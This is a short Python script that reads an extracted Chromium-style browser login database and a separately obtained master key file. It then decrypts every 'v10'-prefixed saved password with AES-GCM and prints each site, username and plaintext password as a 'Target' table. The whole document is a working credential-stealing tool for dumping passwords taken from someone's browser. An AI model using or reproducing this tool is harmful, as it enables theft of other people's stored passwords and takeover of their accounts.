import os
import sqlite3
import binascii
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_offline():
    
    if not os.path.exists("master_key.txt") or not os.path.exists("extracted_login_data.db"):
        print("[-] Missing framework files (master_key.txt or extracted_login_data.db)")
        return

    with open("master_key.txt", "r") as f:
        key_hex = f.read().strip()
    
    master_key = binascii.unhexlify(key_hex)
    aesgcm = AESGCM(master_key)

    
    conn = sqlite3.connect("extracted_login_data.db")
    cursor = conn.cursor()
    
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
    except Exception as e:
        print(f"[-] Database error: {e}")
        conn.close()
        return

    
    print(f"{'Target URL':<45} | {'Username':<30} | {'Decrypted Password':<20}")
    print("-" * 101)

    
    for row in rows:
        url = row[0] if row[0] else "Unknown URL"
        username = row[1] if row[1] else "(No Username)"
        encrypted_password = row[2]

        if not encrypted_password or len(encrypted_password) < 15:
            continue

        plaintext_password = None

        if encrypted_password.startswith(b'v10') or b'v10' in encrypted_password:
            idx = encrypted_password.find(b'v10')
            clean_blob = encrypted_password[idx:]
            
            try:
                iv = clean_blob[3:15]
                ciphertext = clean_blob[15:]
                plaintext_password = aesgcm.decrypt(iv, ciphertext, None).decode('utf-8', errors='ignore')
            except Exception:
                plaintext_password = "[!] Decryption Error"
        else:
            plaintext_password = "[!] Non-v10 Format Block"

        
        display_url = url if len(url) < 42 else url[:39] + "..."
        print(f"{display_url:<45} | {username:<30} | {plaintext_password:<20}")

    conn.close()

if __name__ == "__main__":
    decrypt_offline()
